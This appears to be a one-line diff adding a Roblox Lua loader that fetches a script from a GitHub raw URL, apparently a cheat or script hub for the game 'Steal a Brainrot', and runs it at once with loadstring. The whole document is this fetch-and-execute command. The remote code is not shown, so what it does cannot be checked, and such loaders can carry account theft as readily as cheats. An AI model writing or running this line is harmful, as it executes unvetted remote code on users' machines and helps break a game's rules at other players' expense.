@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MountainTrackLose/loaders/main/loaders/steal-a-brainrot-spam7-8tanc1q0o6toga.lua"))()
